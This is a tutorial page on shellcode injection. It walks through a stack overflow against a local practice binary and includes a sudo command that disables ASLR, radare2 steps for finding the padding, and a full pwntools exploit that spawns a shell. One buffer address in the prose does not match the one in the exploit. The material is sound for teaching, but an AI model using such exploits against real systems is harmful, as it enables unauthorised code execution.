---
description: Running your own code
---

# Shellcode

In real exploits, it's not particularly likely that you will have a `win()` function lying around - shellcode is a way to run your **own** instructions, giving you the ability to run arbitrary commands on the system.

**Shellcode** is essentially **assembly instructions**, except we input them into the binary; once we input it, we overwrite the return pointer to hijack code execution and point at our own instructions!

> Note: I promise you can trust me but you should never _ever_ run shellcode without knowing what it does. Pwntools is safe and has almost all the shellcode you will ever need.

The reason shellcode is successful is that Von Neumann architecture \(the architecture used in most computers today\) does not differentiate between **data** and **instructions** - it doesn't matter where or what you tell it to run, it will attempt to run it.  Therefore, even though our input is data, the computer _doesn't know that_ - and we can use that to our advantage.

### Disabling ASLR

ASLR is a security technique, and while it is not specifically designed to combat shellcode, it involves randomising certain aspects of memory \(we will talk about it in much more detail later\). This randomisation can make shellcode exploits like the one we're about to do more less reliable, so we'll be disabling it for now.

```text
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

> Again, you should never run commands if you don't know what they do.

### Finding the Buffer in Memory

Let's debug `vuln` using `radare2` and work out where in memory the buffer starts; this is where we want to point the return pointer to.

```text
$ r2 -d -A vuln

[0xf7fd40b0]> s sym.unsafe ; pdf
[...]
; var int32_t var_134h @ ebp-0x134
[...]
```

This value that gets printed out is a **local variable** - due to its size, it's fairly likely to be the buffer. Let's set a breakpoint just after `gets()` and find the exact address.

```text
[0x08049172]> dc
Overflow me
<<Found me>>                    <== This was my input
hit breakpoint at: 80491a8
[0x080491a8]> px @ ebp - 0x134
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffffcfb4  3c3c 466f 756e 6420 6d65 3e3e 00d1 fcf7  <<Found me>>....

[...]
```

It appears to be at `0xffffcfd4`; if we run the binary multiple times, it should remain where it is \(if it doesn't, make sure ASLR is disabled!\).

### Finding the Padding

Now we need to calculate the padding until the return pointer. We'll use the De Bruijn sequence as explained in the previous blog post.

```text
$ ragg2 -P 400 -r
<copy this>

$ r2 -d -A vuln
[0xf7fd40b0]> dc
Overflow me
<<paste here>>
[0x73424172]> wopO `dr eip`
312
```

Wehey the padding is 312 bytes!

### Putting it all together

In order for the shellcode to be correct, we're going to set `context.binary` to our binary; this grabs stuff like the arch, os and bits and enables pwntools to provide us with accurate shellcode.

```python
from pwn import *

context.binary = ELF('./vuln')

p = process()
```

> Note: We can use just `process()` because once `context.binary` is set it is assumed to use that process

Now we can use pwntools' awesome shellcode functionality to make it _incredibly_ simple.

```python
payload = asm(shellcraft.sh())          # The shellcode
payload = payload.ljust(312, b'A')      # Padding
payload += p32(0xffffcfb4)              # Address of the Shellcode
```

Yup, that's it. Now let's send it off and use `p.interactive()`, which enables us to communicate to the shell.

```python
log.info(p.clean())

p.sendline(payload)

p.interactive()
```

> If you're getting an EOFError, print out the shellcode and try to find it in memory - the stack address may be wrong

```text
$ python3 exploit.py
[*] 'vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Starting local process 'vuln': pid 3606
[*] Overflow me
[*] Switching to interactive mode
$ whoami
ironstone
$ ls
exploit.py  source.c  vuln
```

And it works! Awesome.

### Final Exploit

```python
from pwn import *

context.binary = ELF('./vuln')

p = process()

payload = asm(shellcraft.sh())          # The shellcode
payload = payload.ljust(312, b'A')      # Padding
payload += p32(0xffffcfb4)              # Address of the Shellcode

log.info(p.clean())

p.sendline(payload)

p.interactive()
```

### Summary

* We injected shellcode, a series of assembly instructions, when prompted for input
* We then hijacked code execution by overwriting the saved return pointer on the stack and modified it to point to our shellcode
* Once the return pointer got popped into EIP, it pointed at our shellcode
* This caused the program to execute our instructions, giving us \(in this case\) a shell for arbitrary command execution

